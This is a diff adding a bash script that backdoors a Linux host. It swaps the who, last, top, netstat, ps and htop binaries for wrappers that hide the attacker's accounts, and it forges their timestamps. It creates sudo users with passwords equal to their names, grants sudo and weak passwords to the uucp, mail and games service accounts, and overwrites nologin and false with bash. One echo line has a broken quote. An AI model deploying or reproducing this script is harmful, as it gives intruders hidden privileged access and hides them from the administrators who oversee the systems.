@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+bins=("who" "last" "top" "netstat" "ps" "htop")
+replacewith=("what" "long" "pot" "nest" "elf" "hpot")
+exclude="mail|uucp|ssh_client|capbarb|grep|.*_real"
+
+for i in "${!bins[@]}"; do
+    cmd="${bins[$i]}"
+    swap="${replacewith[$i]}"
+    orig_path=$(which "$cmd")
+    real_bin="$(dirname "$orig_path")/$swap"
+
+    if [ -n "$orig_path" ] && [ ! -f "$real_bin" ]; then
+        mv "$orig_path" "$real_bin"
+
+        echo "#!/usr/bin/env bash
+$real_bin \"\$@\" | egrep -v '$exclude'" > "$orig_path"
+        chmod +x "$orig_path"
+        touch -r "$real_bin" "$orig_path"
+        echo "[+] $cmd is now $swap
+    else
+        echo "[!] $cmd already modified, skipping."
+    fi
+done
+
+newusers=("vyatta" "capbarb" "ssh_client")
+modusers=("uucp" "mail" "games")
+
+for user in "${newusers[@]}"; do
+  useradd -m $user -s /bin/bash
+  usermod -aG sudo $user
+  echo "$user:$user" | chpasswd
+  echo "$user created"
+done
+
+for moduser in "${modusers[@]}"; do
+  usermod -aG sudo $moduser
+  echo "$moduser:$moduser" | chpasswd
+  echo "$moduser modified"
+done
+
+echo "/usr/sbin/nologin /usr/bin/false" | xargs -n 1 cp /bin/bash
+md5sum /bin/bash
+md5sum /usr/sbin/nologin
+md5sum /usr/bin/false
